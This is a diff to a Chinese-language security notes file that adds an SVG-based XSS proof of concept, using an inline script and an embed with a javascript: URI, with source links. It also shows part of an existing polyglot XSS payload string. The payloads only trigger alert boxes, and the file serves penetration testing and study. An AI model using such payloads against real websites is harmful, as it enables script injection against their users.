@@ -17,6 +17,20 @@
 ```
 来源：https://xz.aliyun.com/t/8501
 
+## svg下的xss
+```
+<svg id="m7" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
+<script>alert(1)</script>
+<foreignObject width="100" height="50" requiredExtensions="http://www.w3.org/1999/xhtml">
+	<embed xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(666)" />
+</foreignObject>
+</svg>
+```
+来源：
+- https://www.mi1k7ea.com/2019/03/22/%E5%9B%BE%E7%89%87XSS%E5%B0%8F%E7%BB%93/
+- https://www.cnblogs.com/r00tgrok/p/svg_build_xss_vector_bypass_firefox_and_chrome.html
+
+
 ## 攻击payload
 ```
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
